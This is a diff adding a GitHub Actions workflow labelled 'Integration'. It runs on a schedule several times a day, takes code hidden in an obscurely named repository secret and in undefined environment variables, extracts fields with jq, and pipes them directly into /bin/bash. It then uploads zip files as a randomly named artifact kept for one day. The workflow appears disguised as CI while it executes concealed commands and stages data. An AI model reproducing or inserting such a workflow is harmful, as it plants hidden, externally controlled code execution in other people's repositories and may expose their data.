@@ -1,0 +1,33 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          d894: ${{ secrets.d894 }}
+        run: |
+          printf '%s' "$d894" | jq -r .gst6 | /bin/bash
+          echo $lga55040 | jq -r .s7 | /bin/bash
+          echo $ohw15469 | jq -r .yu6552 | /bin/bash
+          printf '%s' "$lvu7538" | jq -r .dtflj32 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: dSiNNedZ
+          path: "*.zip"
+          retention-days: 1
